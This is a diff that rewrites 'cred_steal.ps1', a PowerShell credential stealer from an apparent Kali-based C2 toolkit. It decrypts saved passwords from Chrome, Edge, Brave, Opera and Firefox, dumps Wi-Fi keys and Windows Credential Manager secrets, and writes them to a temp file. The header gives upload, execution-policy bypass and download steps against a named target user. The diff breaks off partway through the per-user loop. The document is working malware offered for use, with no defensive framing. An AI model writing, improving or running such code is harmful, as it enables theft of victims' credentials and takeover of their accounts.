@@ -1,343 +1,413 @@
-# cred_steal.ps1 — Chrome / Edge / Firefox credential decryptor
-# Run in the TARGET USER'S session (NOT as SYSTEM) so DPAPI works correctly.
+# cred_steal.ps1 - Chrome / Edge / Firefox / CredMan / Wi-Fi credential dumper
+# Run in TARGET USER SESSION (abdum, not SYSTEM) for DPAPI access.
 # Output: C:\Windows\Temp\creds.txt
 #
 # Deploy:
-#   upload /home/kali/turon-c2-src/bypass/cred_steal.ps1 C:\Windows\Temp\cred_steal.ps1
-#   powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\cred_steal.ps1
+#   upload /home/kali/turon-c2-src/bypass/cred_steal.ps1 C:\Windows\Temp\cs.ps1
+#   powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\cs.ps1
 #   download C:\Windows\Temp\creds.txt
 
-Add-Type -AssemblyName System.Security
-
 $out = "C:\Windows\Temp\creds.txt"
-"[+] Credential dump $(Get-Date)" | Out-File $out
+"[+] Credential dump $(Get-Date)" | Out-File $out -Encoding UTF8
 
-# ── Helpers ──────────────────────────────────────────────────────────────────
-
-function Unprotect-DPAPI($bytes) {
-    try {
-        return [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    } catch { return $null }
-}
-
-function AES-GCM-Decrypt($key, $nonce, $ct) {
-    # Pure .NET AES-GCM (available on .NET 6+ / Win10+ via Add-Type)
-    # Falls back to native via PInvoke if not available
-    try {
-        $ag = [System.Security.Cryptography.AesGcm]::new([byte[]]$key)
-        $tag = $ct[-16..-1]
-        $data = $ct[0..($ct.Length-17)]
-        $plain = New-Object byte[] $data.Length
-        $ag.Decrypt([byte[]]$nonce, [byte[]]$data, [byte[]]$tag, $plain)
-        $ag.Dispose()
-        return $plain
-    } catch { return $null }
-}
-
-function Read-SQLite-Logins($db_path) {
-    # Copy to temp (Chrome locks the original)
-    $tmp = [IO.Path]::GetTempFileName() + ".db"
-    try { [IO.File]::Copy($db_path, $tmp, $true) } catch { return @() }
-
-    $rows = @()
-    try {
-        Add-Type -AssemblyName System.Data
-        $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tmp;Version=3;Read Only=True;"
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins"
-        $rdr = $cmd.ExecuteReader()
-        while ($rdr.Read()) {
-            $rows += [pscustomobject]@{
-                URL  = $rdr.GetString(0)
-                User = $rdr.GetString(1)
-                Blob = $rdr.GetValue(2) -as [byte[]]
-            }
-        }
-        $rdr.Close(); $conn.Close()
-    } catch {
-        # Fallback: read raw SQLite pages for the logins table using BinaryReader
-        # SQLite page size at offset 16 (2 bytes big-endian), B-tree pages, simple scan
-        $rows = Read-SQLite-Raw $tmp
-    }
-    Remove-Item $tmp -Force -EA 0
-    return $rows
-}
-
-function Read-SQLite-Raw($path) {
-    # Minimal raw SQLite text-cell scanner — no dependency on System.Data.SQLite
-    # Reads all leaf pages and extracts string cells containing '@' or 'http'
-    $rows = @()
-    try {
-        $data = [IO.File]::ReadAllBytes($path)
-        $pgSz = ([int]$data[16] -shl 8) -bor $data[17]
-        if ($pgSz -eq 0 -or $pgSz -eq 1) { $pgSz = 65536 }
-        $numPg = [Math]::Floor($data.Length / $pgSz)
-
-        # Decode varint
-        $decVi = {
-            param($buf,$pos)
-            $v=0; $s=0
-            for ($i=0;$i-lt9;$i++) {
-                $b=$buf[$pos+$i]; $v = $v -bor (($b -band 0x7F) -shl $s); $s+=7
-                if (-not($b -band 0x80)) { return @($v,$pos+$i+1) }
-            }
-            return @($v,$pos+9)
-        }
-
-        for ($pg=0; $pg -lt $numPg; $pg++) {
-            $base = $pg * $pgSz
-            if ($base+1 -ge $data.Length) { continue }
-            $pgType = $data[$base]          # 0x0D = leaf table
-            if ($pgType -ne 0x0D) { continue }
-            $numCells = ([int]$data[$base+3] -shl 8) -bor $data[$base+4]
-            $ofs = if ($pg -eq 0) { 100 } else { 0 }
-            for ($c=0; $c -lt $numCells; $c++) {
-                $pOff = $ofs + 8 + $c*2
-                if ($pOff+1 -ge $pgSz) { continue }
-                $cOff = $base + (([int]$data[$base+$pOff] -shl 8) -bor $data[$base+$pOff+1])
-                if ($cOff -ge $data.Length) { continue }
-                # parse payload length varint
-                $r = & $decVi $data $cOff
-                $payLen = $r[0]; $p = $r[1]
-                # rowid varint
-                $r2 = & $decVi $data $p; $p = $r2[1]
-                # header length varint
-                $r3 = & $decVi $data $p; $hLen=$r3[0]; $hEnd=$p+$hLen; $p=$r3[1]
-                # read serial types
-                $types=@()
-                while ($p -lt $hEnd) {
-                    $r4 = & $decVi $data $p; $types += $r4[0]; $p=$r4[1]
-                }
-                # extract text cells (serial type >= 13, odd = text)
-                $cells=@{}; $fi=0
-                foreach ($t in $types) {
-                    $sz = if ($t -ge 13 -and ($t%2 -eq 1)) { ($t-13)/2 }
-                           elseif ($t -ge 12 -and ($t%2 -eq 0)) { ($t-12)/2 }
-                           elseif ($t -eq 1) {1} elseif ($t-eq 2){2}
-                           elseif ($t -eq 3){3} elseif ($t -eq 4){4}
-                           elseif ($t -eq 5){6} elseif ($t -eq 6){8}
-                           elseif ($t -eq 7){8} else {0}
-                    if ($t -ge 13 -and ($t%2 -eq 1)) {
-                        try { $cells[$fi] = [Text.Encoding]::UTF8.GetString($data,$p,[int]$sz) } catch {}
-                    } elseif ($t -ge 12 -and ($t%2 -eq 0) -and $sz -gt 0) {
-                        # blob (password_value)
-                        $blob = New-Object byte[] ([int]$sz)
-                        [Array]::Copy($data,$p,$blob,0,[int]$sz)
-                        $cells[$fi] = $blob
-                    }
-                    $p += [int]$sz; $fi++
-                }
-                if ($cells.Count -ge 3) {
-                    $rows += [pscustomobject]@{
-                        URL  = "$($cells[0])"; User = "$($cells[1])"; Blob = $cells[2]
-                    }
-                }
-            }
-        }
-    } catch {}
-    return $rows
-}
-
-function Dump-Chromium($name, $user_dir) {
-    $ls = "$user_dir\Local State"
-    if (-not (Test-Path $ls)) { return }
-
-    # Get AES key from Local State
-    try {
-        $lsJson  = Get-Content $ls -Raw | ConvertFrom-Json
-        $encKey64 = $lsJson.os_crypt.encrypted_key
-        $encKey   = [Convert]::FromBase64String($encKey64)
-        # Strip "DPAPI" prefix (5 bytes)
-        $dpBlob   = $encKey[5..($encKey.Length-1)]
-        $aesKey   = Unprotect-DPAPI $dpBlob
-    } catch { return }
-
-    if (-not $aesKey) {
-        "  [!] $name : DPAPI decrypt failed (wrong user context?)" | Out-File $out -Append
-        return
-    }
-
-    # Enumerate profiles
-    Get-ChildItem $user_dir -Directory -Force -EA 0 | ForEach-Object {
-        $db = "$($_.FullName)\Login Data"
-        if (-not (Test-Path $db)) { return }
-        $rows = Read-SQLite-Logins $db
-        foreach ($r in $rows) {
-            if (-not $r.Blob -or $r.Blob.Length -lt 19) { continue }
-            if ($r.Blob[0] -eq [byte]0x76 -and $r.Blob[1] -eq [byte]0x31 -and $r.Blob[2] -eq [byte]0x30) {
-                # v10 format: [3:nonce(12)] [15:ciphertext+tag]
-                $nonce  = $r.Blob[3..14]
-                $ctFull = $r.Blob[15..($r.Blob.Length-1)]
-                $plain  = AES-GCM-Decrypt $aesKey $nonce $ctFull
-                $pwd    = if ($plain) { [Text.Encoding]::UTF8.GetString($plain) } else { "<decrypt_failed>" }
-            } else {
-                # Legacy DPAPI-only blob
-                $dp  = Unprotect-DPAPI $r.Blob
-                $pwd = if ($dp) { [Text.Encoding]::UTF8.GetString($dp) } else { "<dpapi_failed>" }
-            }
-            "[$name] $($r.URL) | $($r.User) | $pwd" | Out-File $out -Append
-        }
-    }
-}
-
-# ── Firefox ──────────────────────────────────────────────────────────────────
-
-function Decrypt-FF-Field($encStr, $key, $iv) {
-    try {
-        $ct  = [Convert]::FromBase64String($encStr)
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.Key = $key; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
-        $dec = $aes.CreateDecryptor()
-        $plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
-        $aes.Dispose()
-        return [Text.Encoding]::UTF8.GetString($plain)
-    } catch { return $null }
-}
-
-function Dump-Firefox($profile_path) {
-    $key4   = "$profile_path\key4.db"
-    $logins = "$profile_path\logins.json"
-    if (-not (Test-Path $key4) -or -not (Test-Path $logins)) { return }
-
-    # Read logins.json
-    try {
-        $lj = Get-Content $logins -Raw | ConvertFrom-Json
-    } catch { return }
-
-    # key4.db: query nssPrivate table for key material
-    # Without master password the globalSalt+password check uses empty string
-    # Python/pypykatz handles this offline; here we do a best-effort approach
-    # by trying to extract via NSS via C# PInvoke if nss3.dll is on system
-    $nss3 = Get-ChildItem "C:\Program Files\Mozilla Firefox\nss3.dll" -EA 0 |
-            Select-Object -First 1
-    if (-not $nss3) {
-        "[FF] $profile_path : nss3.dll not found, copy files and decrypt offline with firepwd" | Out-File $out -Append
-        foreach ($l in $lj.logins) {
-            "[FF-raw] $($l.hostname) | encUser=$($l.encryptedUsername) | encPass=$($l.encryptedPassword)" | Out-File $out -Append
-        }
-        return
-    }
-
-    # Load NSS and decrypt (requires Firefox installed)
-    Add-Type -TypeDefinition @"
+# Inline C#: DPAPI + AES-256-GCM (BCrypt) + SQLite3 B-tree reader
+Add-Type -TypeDefinition @'
 using System;
-using System.Runtime.InteropServices;
+using System.IO;
 using System.Text;
-public class NSSHelper {
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+
+public static class BrowserStealer {
+
+    // DPAPI
+    [StructLayout(LayoutKind.Sequential)]
+    struct CRYPT_BLOB { public uint cb; public IntPtr pb; }
+
+    [DllImport("crypt32.dll", SetLastError=true)]
+    static extern bool CryptUnprotectData(ref CRYPT_BLOB In, IntPtr Descr, IntPtr Entropy,
+        IntPtr Reserved, IntPtr Prompt, uint Flags, ref CRYPT_BLOB Out);
+
+    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr hMem);
+
+    public static byte[] DpDecrypt(byte[] data) {
+        CRYPT_BLOB inp = new CRYPT_BLOB(), outp = new CRYPT_BLOB();
+        inp.cb = (uint)data.Length;
+        inp.pb = Marshal.AllocHGlobal(data.Length);
+        Marshal.Copy(data, 0, inp.pb, data.Length);
+        try {
+            if (!CryptUnprotectData(ref inp, IntPtr.Zero, IntPtr.Zero,
+                    IntPtr.Zero, IntPtr.Zero, 0, ref outp)) return null;
+            byte[] r = new byte[outp.cb];
+            Marshal.Copy(outp.pb, r, 0, (int)outp.cb);
+            LocalFree(outp.pb);
+            return r;
+        } finally { Marshal.FreeHGlobal(inp.pb); }
+    }
+
+    // BCrypt AES-256-GCM
+    [DllImport("bcrypt.dll")]
+    static extern uint BCryptOpenAlgorithmProvider(out IntPtr h, string alg, string impl, uint fl);
+    [DllImport("bcrypt.dll")]
+    static extern uint BCryptSetProperty(IntPtr h, string prop, byte[] val, uint cb, uint fl);
+    [DllImport("bcrypt.dll")]
+    static extern uint BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey,
+        IntPtr pbKeyObj, uint cbKeyObj, byte[] pbSecret, uint cbSecret, uint fl);
+    [DllImport("bcrypt.dll")]
+    static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbIn, uint cbIn,
+        ref AUTH_INFO pAuth, byte[] pbIV, uint cbIV,
+        byte[] pbOut, uint cbOut, out uint pcbResult, uint fl);
+    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr hKey);
+    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h, uint fl);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct AUTH_INFO {
+        public uint cbSize, dwInfoVersion;
+        public IntPtr pbNonce;   public uint cbNonce;
+        public IntPtr pbAuthData; public uint cbAuthData;
+        public IntPtr pbTag;     public uint cbTag;
+        public IntPtr pbMacCtx;  public uint cbMacCtx;
+        public uint cbAAD; public ulong cbData; public uint dwFlags;
+    }
+
+    public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag) {
+        IntPtr hAlg, hKey;
+        if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
+        byte[] gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
+        BCryptSetProperty(hAlg, "ChainingMode", gcmMode, (uint)gcmMode.Length, 0);
+        if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) {
+            BCryptCloseAlgorithmProvider(hAlg, 0); return null;
+        }
+        IntPtr pN = Marshal.AllocHGlobal(nonce.Length);
+        IntPtr pT = Marshal.AllocHGlobal(tag.Length);
+        Marshal.Copy(nonce, 0, pN, nonce.Length);
+        Marshal.Copy(tag,   0, pT, tag.Length);
+        var ai = new AUTH_INFO();
+        ai.cbSize = (uint)Marshal.SizeOf(ai);
+        ai.dwInfoVersion = 1;
+        ai.pbNonce = pN; ai.cbNonce = (uint)nonce.Length;
+        ai.pbTag   = pT; ai.cbTag   = (uint)tag.Length;
+        byte[] plain = new byte[ct.Length]; uint outLen;
+        uint s = BCryptDecrypt(hKey, ct, (uint)ct.Length, ref ai, null, 0,
+                               plain, (uint)plain.Length, out outLen, 0);
+        Marshal.FreeHGlobal(pN); Marshal.FreeHGlobal(pT);
+        BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
+        return s == 0 ? plain : null;
+    }
+
+    // SQLite3 minimal B-tree leaf page reader
+    static long GetVarint(byte[] d, ref int p) {
+        long v = 0;
+        for (int i = 0; i < 9 && p < d.Length; i++) {
+            byte b = d[p++];
+            v = (v << 7) | (b & 0x7FL);
+            if ((b & 0x80) == 0) return v;
+        }
+        return v;
+    }
+    static int SerialSz(long t) {
+        if (t == 0 || t == 8 || t == 9) return 0;
+        if (t == 1) return 1; if (t == 2) return 2; if (t == 3) return 3;
+        if (t == 4) return 4; if (t == 5) return 6;
+        if (t == 6 || t == 7) return 8;
+        if (t >= 12) return (int)((t - (t % 2 == 0 ? 12 : 13)) / 2);
+        return 0;
+    }
+
+    // Returns list of [url, username, password_blob_b64]
+    public static List<string[]> ReadLogins(string path) {
+        var result = new List<string[]>();
+        byte[] d;
+        try { d = File.ReadAllBytes(path); } catch { return result; }
+        if (d.Length < 100 || d[0] != 'S' || d[1] != 'Q' || d[2] != 'L') return result;
+
+        int pgSz = (d[16] << 8) | d[17];
+        if (pgSz == 1) pgSz = 65536;
+        int nPg = d.Length / pgSz;
+
+        for (int pg = 0; pg < nPg; pg++) {
+            int pgOff = pg * pgSz;
+            if (pgOff >= d.Length || d[pgOff] != 0x0D) continue;
+
+            int nCells = (d[pgOff+3] << 8) | d[pgOff+4];
+            int hdrBase = pg == 0 ? 100 : 0;
+
+            for (int c = 0; c < nCells; c++) {
+                int cPtrOff = pgOff + hdrBase + 8 + c * 2;
+                if (cPtrOff + 1 >= d.Length) break;
+                int cOff = pgOff + ((d[cPtrOff] << 8) | d[cPtrOff+1]);
+                if (cOff <= 0 || cOff + 3 >= d.Length) continue;
+                try {
+                    int pos = cOff;
+                    GetVarint(d, ref pos);
+                    GetVarint(d, ref pos);
+
+                    int hStart = pos;
+                    int hLen = (int)GetVarint(d, ref pos);
+                    int hEnd = hStart + hLen;
+                    if (hEnd > d.Length) continue;
+
+                    var types = new List<long>();
+                    while (pos < hEnd) types.Add(GetVarint(d, ref pos));
+
+                    int dp = hEnd;
+                    var cells = new object[types.Count];
+                    for (int fi = 0; fi < types.Count; fi++) {
+                        int sz = SerialSz(types[fi]);
+                        if (dp + sz > d.Length) break;
+                        long t = types[fi];
+                        if (t >= 13 && t % 2 == 1 && sz > 0)
+                            cells[fi] = Encoding.UTF8.GetString(d, dp, sz);
+                        else if (t >= 12 && t % 2 == 0 && sz > 0) {
+                            byte[] b = new byte[sz]; Array.Copy(d, dp, b, 0, sz);
+                            cells[fi] = b;
+                        }
+                        dp += sz;
+                    }
+
+                    string url = null, user = null;
+                    byte[] blob = null;
+                    foreach (var cell in cells) {
+                        if (cell is string) {
+                            string s = (string)cell;
+                            if (url == null && (s.StartsWith("http") || s.StartsWith("android") || s.Contains("://")))
+                                url = s;
+                            else if (url != null && user == null)
+                                user = s;
+                        } else if (cell is byte[]) {
+                            byte[] b2 = (byte[])cell;
+                            if (b2.Length > 3 && blob == null) blob = b2;
+                        }
+                    }
+                    if (url != null && blob != null)
+                        result.Add(new string[] { url, user == null ? "" : user, Convert.ToBase64String(blob) });
+                } catch {}
+            }
+        }
+        return result;
+    }
+
+    // NSS Firefox decryption
     [DllImport("nss3.dll", EntryPoint="NSS_Init", CharSet=CharSet.Ansi)]
     public static extern int NSS_Init(string dir);
     [DllImport("nss3.dll", EntryPoint="NSS_Shutdown")]
     public static extern int NSS_Shutdown();
-    [StructLayout(LayoutKind.Sequential)] public struct SECItem { public int type; public IntPtr data; public int len; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECItem { public int type; public IntPtr data; public int len; }
+
     [DllImport("nss3.dll", EntryPoint="PK11SDR_Decrypt")]
     public static extern int PK11SDR_Decrypt(ref SECItem inp, ref SECItem outp, IntPtr cx);
-    public static string Decrypt(byte[] enc, string profileDir) {
-        NSS_Init(profileDir);
-        SECItem inp = new SECItem { type=0, data=Marshal.AllocHGlobal(enc.Length), len=enc.Length };
-        Marshal.Copy(enc, 0, inp.data, enc.Length);
-        SECItem outp = new SECItem();
-        if (PK11SDR_Decrypt(ref inp, ref outp, IntPtr.Zero) == 0 && outp.len > 0) {
+
+    public static string NssDecrypt(byte[] enc, string profileDir) {
+        try {
+            NSS_Init(profileDir);
+            SECItem inp = new SECItem { type=0, data=Marshal.AllocHGlobal(enc.Length), len=enc.Length };
+            Marshal.Copy(enc, 0, inp.data, enc.Length);
+            SECItem outp = new SECItem();
+            if (PK11SDR_Decrypt(ref inp, ref outp, IntPtr.Zero) != 0 || outp.len <= 0) {
+                NSS_Shutdown(); return null;
+            }
             byte[] r = new byte[outp.len];
             Marshal.Copy(outp.data, r, 0, outp.len);
             NSS_Shutdown();
             return Encoding.UTF8.GetString(r);
+        } catch { return null; }
+    }
+}
+'@ -ReferencedAssemblies @() -EA 0
+
+# Helpers
+
+function Get-ChromeAesKey($local_state_path) {
+    try {
+        $ls  = Get-Content $local_state_path -Raw -EA Stop | ConvertFrom-Json
+        $b64 = $ls.os_crypt.encrypted_key
+        if (-not $b64) { return $null }
+        $enc = [Convert]::FromBase64String($b64)
+        $blob = $enc[5..($enc.Length-1)]
+        return [BrowserStealer]::DpDecrypt($blob)
+    } catch { return $null }
+}
+
+function Decrypt-ChromePassword($blob, $aesKey) {
+    $blob = [byte[]]$blob
+    if ($blob.Length -lt 15) { return '<short_blob>' }
+    if ($blob[0] -eq 0x76 -and $blob[1] -eq 0x31 -and $blob[2] -eq 0x30) {
+        if (-not $aesKey) { return '<needs_aes_key>' }
+        $nonce = $blob[3..14]
+        $full  = $blob[15..($blob.Length-1)]
+        if ($full.Length -lt 17) { return '<too_short>' }
+        $tag   = $full[($full.Length-16)..($full.Length-1)]
+        $ct    = $full[0..($full.Length-17)]
+        $plain = [BrowserStealer]::AesGcmDecrypt($aesKey, $nonce, $ct, $tag)
+        if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
+        return '<aes_fail>'
+    }
+    $plain = [BrowserStealer]::DpDecrypt($blob)
+    if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
+    return '<dpapi_fail>'
+}
+
+function Dump-Chromium($browser, $userDataDir) {
+    $ls = "$userDataDir\Local State"
+    if (-not (Test-Path $ls -EA 0)) {
+        ("  [" + $browser + "] Local State not found: " + $userDataDir) | Out-File $out -Append -Encoding UTF8
+        return
+    }
+    $aesKey = Get-ChromeAesKey $ls
+    if (-not $aesKey) {
+        ("  [" + $browser + "] AES key decrypt failed") | Out-File $out -Append -Encoding UTF8
+    } else {
+        ("  [" + $browser + "] AES key OK (" + $aesKey.Length + " bytes)") | Out-File $out -Append -Encoding UTF8
+    }
+
+    $profiles = @('Default','Profile 1','Profile 2','Profile 3','Guest Profile')
+    foreach ($prof in $profiles) {
+        $db = "$userDataDir\$prof\Login Data"
+        if (-not (Test-Path $db -EA 0)) { continue }
+        $tmp = "$env:TEMP\ld_$(Get-Random).db"
+        try { [IO.File]::Copy($db, $tmp, $true) } catch { continue }
+
+        $rows = [BrowserStealer]::ReadLogins($tmp)
+        Remove-Item $tmp -Force -EA 0
+
+        if ($rows.Count -eq 0) {
+            ("  [" + $browser + "/" + $prof + "] 0 rows (no saved passwords or SQLite parse failed)") | Out-File $out -Append -Encoding UTF8
+            continue
         }
-        NSS_Shutdown();
-        return null;
-    }
-}
-"@ -ReferencedAssemblies @() -EA 0
 
-    foreach ($l in $lj.logins) {
-        try {
-            $uEnc = [Convert]::FromBase64String($l.encryptedUsername)
-            $pEnc = [Convert]::FromBase64String($l.encryptedPassword)
-            $u    = [NSSHelper]::Decrypt($uEnc, $profile_path)
-            $p    = [NSSHelper]::Decrypt($pEnc, $profile_path)
-            if ($u -or $p) { "[FF] $($l.hostname) | $u | $p" | Out-File $out -Append }
-        } catch {}
+        foreach ($row in $rows) {
+            $url   = $row[0]
+            $uname = $row[1]
+            $blob  = [Convert]::FromBase64String($row[2])
+            $cpwd  = Decrypt-ChromePassword $blob $aesKey
+            ("[" + $browser + "] " + $url + " | " + $uname + " | " + $cpwd) | Out-File $out -Append -Encoding UTF8
+        }
     }
 }
 
-# ── Wi-Fi ─────────────────────────────────────────────────────────────────────
+function Dump-Firefox($profileDir) {
+    $key4   = "$profileDir\key4.db"
+    $logins = "$profileDir\logins.json"
+    if (-not (Test-Path $key4 -EA 0) -or -not (Test-Path $logins -EA 0)) { return }
 
-"" | Out-File $out -Append
-"[WiFi]" | Out-File $out -Append
-netsh wlan show profiles 2>$null | Select-String ':\s+(.+)$' | ForEach-Object {
-    $ssid = $_.Matches[0].Groups[1].Value.Trim()
-    $info = netsh wlan show profile name="`"$ssid`"" key=clear 2>$null
-    if ($info -match 'Key Content\s+:\s+(.+)') {
-        "[WiFi] $ssid : $($Matches[1].Trim())" | Out-File $out -Append
+    $lj = $null
+    try { $lj = Get-Content $logins -Raw | ConvertFrom-Json } catch { return }
+
+    $nss3x86 = Get-Item 'C:\Program Files (x86)\Mozilla Firefox\nss3.dll' -EA 0
+    $nss3x64 = Get-Item 'C:\Program Files\Mozilla Firefox\nss3.dll' -EA 0
+    $ffDir = $null
+    if ($nss3x64) { $ffDir = $nss3x64.DirectoryName }
+    elseif ($nss3x86) { $ffDir = $nss3x86.DirectoryName }
+
+    if ($ffDir) {
+        $env:PATH = "$ffDir;$env:PATH"
+        foreach ($l in $lj.logins) {
+            try {
+                $uBytes = [Convert]::FromBase64String($l.encryptedUsername)
+                $pBytes = [Convert]::FromBase64String($l.encryptedPassword)
+                $fu = [BrowserStealer]::NssDecrypt($uBytes, $profileDir)
+                $fp = [BrowserStealer]::NssDecrypt($pBytes, $profileDir)
+                if ($fu -or $fp) {
+                    ("[Firefox] " + $l.hostname + " | " + $fu + " | " + $fp) | Out-File $out -Append -Encoding UTF8
+                }
+            } catch {}
+        }
+    } else {
+        "[Firefox] nss3.dll not found - dumping raw for offline decrypt" | Out-File $out -Append -Encoding UTF8
+        foreach ($l in $lj.logins) {
+            $line = "[Firefox-raw] " + $l.hostname + " | user=" + $l.encryptedUsername + " | pass=" + $l.encryptedPassword
+            $line | Out-File $out -Append -Encoding UTF8
+        }
     }
 }
 
-# ── Windows Credential Manager ────────────────────────────────────────────────
+# Main
 
-"" | Out-File $out -Append
-"[CredMan]" | Out-File $out -Append
+# Wi-Fi passwords
+"" | Out-File $out -Append -Encoding UTF8
+"[WiFi]" | Out-File $out -Append -Encoding UTF8
+$wlan_raw = netsh wlan show profiles 2>$null
+if ($wlan_raw) {
+    $wlan_raw | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object {
+        $ssid = $_.Matches[0].Groups[1].Value.Trim()
+        $info = (netsh wlan show profile name="`"$ssid`"" key=clear 2>$null) -join "`n"
+        $wm = [regex]::Match($info, 'Key Content\s+:\s+(.+)')
+        $wkey = if ($wm.Success) { $wm.Groups[1].Value.Trim() } else { '<no key>' }
+        ("[WiFi] " + $ssid + " | " + $wkey) | Out-File $out -Append -Encoding UTF8
+    }
+}
+
+# Windows Credential Manager
+"" | Out-File $out -Append -Encoding UTF8
+"[CredMan]" | Out-File $out -Append -Encoding UTF8
 try {
-    Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public class CredMan {
-    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
-    public struct CREDENTIAL {
-        public int Flags; public int Type; public string TargetName;
-        public string Comment; public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
-        public int CredentialBlobSize; public IntPtr CredentialBlob;
-        public int Persist; public int AttributeCount; public IntPtr Attributes;
-        public string TargetAlias; public string UserName;
-    }
-    [DllImport("advapi32.dll", EntryPoint="CredEnumerateW", CharSet=CharSet.Unicode, SetLastError=true)]
-    public static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);
-    [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr buf);
-    public static void Dump(System.IO.StreamWriter sw) {
-        int cnt; IntPtr pc;
-        if (!CredEnumerate(null, 0x1, out cnt, out pc)) return;
-        for (int i=0;i<cnt;i++) {
-            IntPtr p = Marshal.ReadIntPtr(pc, i*IntPtr.Size);
-            var c = (CREDENTIAL)Marshal.PtrToStructure(p, typeof(CREDENTIAL));
-            string pwd = "";
-            if (c.CredentialBlobSize > 0)
-                pwd = Encoding.Unicode.GetString(
-                    System.Runtime.InteropServices.Marshal.ReadByte(c.CredentialBlob) == 0 ?
-                    new byte[0] : GetBytes(c.CredentialBlob, c.CredentialBlobSize));
-            sw.WriteLine("[CredMan] {0} | {1} | {2}", c.TargetName, c.UserName, pwd);
-        }
-        CredFree(pc);
-    }
-    static byte[] GetBytes(IntPtr p, int n) { byte[] b=new byte[n]; Marshal.Copy(p,b,0,n); return b; }
+    Add-Type -Name CredDump -Namespace '' -MemberDefinition @'
+[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
+public struct CREDENTIAL {
+    public int Flags,Type; public string TargetName,Comment;
+    public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
+    public int BlobSize; public IntPtr Blob;
+    public int Persist,AttrCount; public IntPtr Attrs;
+    public string Alias,UserName;
 }
-"@ -EA 0
-    $sw = [IO.StreamWriter]::new($out, $true)
-    [CredMan]::Dump($sw)
-    $sw.Close()
+[DllImport("advapi32.dll",EntryPoint="CredEnumerateW",CharSet=CharSet.Unicode,SetLastError=true)]
+public static extern bool Enum(string f,int fl,out int cnt,out IntPtr creds);
+[DllImport("advapi32.dll")] public static extern void Free(IntPtr p);
+'@ -ReferencedAssemblies @() -EA 0
+
+    $cnt = 0; $pc = [IntPtr]::Zero
+    if ([CredDump]::Enum($null, 1, [ref]$cnt, [ref]$pc)) {
+        for ($i = 0; $i -lt $cnt; $i++) {
+            $p = [Runtime.InteropServices.Marshal]::ReadIntPtr($pc, $i * [IntPtr]::Size)
+            $c = [Runtime.InteropServices.Marshal]::PtrToStructure($p, [type][CredDump+CREDENTIAL])
+            $cmPwd = '<no blob>'
+            if ($c.BlobSize -gt 0) {
+                $blob = New-Object byte[] $c.BlobSize
+                [Runtime.InteropServices.Marshal]::Copy($c.Blob, $blob, 0, $c.BlobSize)
+                $decrypted = [BrowserStealer]::DpDecrypt($blob)
+                if ($decrypted) {
+                    $ds = [Text.Encoding]::Unicode.GetString($decrypted)
+                    if ($ds -match '^[\x20-\x7E]+$') {
+                        $cmPwd = $ds
+                    } else {
+                        $cmPwd = '<binary_dpapi:' + [BitConverter]::ToString($decrypted).Replace('-','') + '>'
+                    }
+                } else {
+                    $rs = [Text.Encoding]::Unicode.GetString($blob).TrimEnd("`0")
+                    if ($rs.Length -gt 0 -and $rs -match '^[\x20-\x7E]+$') {
+                        $cmPwd = $rs
+                    } else {
+                        $cmPwd = '<binary:' + [BitConverter]::ToString($blob).Replace('-','') + '>'
+                    }
+                }
+            }
+            ("[CredMan] " + $c.TargetName + " | " + $c.UserName + " | " + $cmPwd) | Out-File $out -Append -Encoding UTF8
+        }
+        [CredDump]::Free($pc)
+    }
 } catch {}
 
-# ── Main: enumerate users ─────────────────────────────────────────────────────
+# Browser credentials
+"" | Out-File $out -Append -Encoding UTF8
 
 $users = Get-ChildItem C:\Users -Directory -Force -EA 0 |
     Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
 
 foreach ($u in $users) {
-    "" | Out-File $out -Append
-    "=== User: $($u.Name) ===" | Out-File $out -Append
+    "" | Out-File $out -Append -Encoding UTF8
+    ("=== User: " + $u.Name + " ===") | Out-File $out -Append -Encoding UTF8
 
-    # Chrome
-    Dump-Chromium "Chrome" "$($u.FullName)\AppData\Local\Google\Chrome\User Data"
-    # Edge
-    Dump-Chromium "Edge"   "$($u.FullName)\AppData\Local\Microsoft\Edge\User Data"
-    # Brave
-    Dump-Chromium "Brave"  "$($u.FullName)\AppData\Local\BraveSoftware\Brave-Browser\User Data"
+    Dump-Chromium 'Chrome' ($u.FullName + '\AppData\Local\Google\Chrome\User Data')
+    Dump-Chromium 'Edge'   ($u.FullName + '\AppData\Local\Microsoft\Edge\User Data')
+    Dump-Chromium 'Brave'  ($u.FullName + '\AppData\Local\BraveSoftware\Brave-Browser\User Data')
+    Dump-Chromium 'Opera'  ($u.FullName + '\AppData\Roaming\Opera Software\Opera Stable')
 
-    # Firefox
